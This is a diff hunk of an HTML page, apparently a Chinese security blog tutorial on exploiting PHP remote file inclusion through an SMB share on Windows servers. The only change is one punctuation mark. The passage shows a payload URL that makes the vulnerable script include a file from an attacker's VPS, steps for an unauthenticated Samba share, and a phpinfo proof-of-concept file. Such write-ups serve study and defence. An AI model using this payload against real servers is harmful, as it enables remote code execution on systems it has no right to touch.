@@ -233,7 +233,7 @@
 <p>假设服务端的php代码（aaa.php）如下图所示：</p>
 <h2 id="第1种：smb协议"><a href="#第1种：smb协议" class="headerlink" title="第1种：smb协议"></a><strong>第1种：smb协议</strong></h2><p>Payload：<a target="_blank" rel="noopener" href="http://127.0.0.1/aaa.php?path=%5C%5C43.5*.**.74%5Cica%5Cabc1238.htm">http://127.0.0.1/aaa.php?path=\\43.5*.**.74\ica\abc1238.htm</a></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210821114523590.png" srcset="/img/loading.gif" lazyload alt="image-20210821114523590"></p>
-<p>这种方法只适用于Windows类型的网站服务器，不能用于Linux服务器。</p>
+<p>这种方法只适用于Windows类型的网站服务器，不能用于Linux服务器.</p>
 <p>首先在VPS上搭建Samba服务，然后添加一个无需认证即可访问的共享目录，配置信息如下图所示：</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210821114541745.png" srcset="/img/loading.gif" lazyload alt="image-20210821114541745"></p>
 <p>然后在/home/share目录创建abc1238.htm文件，文件内容为：<font color="red"><?php phpinfo();?></font></p>
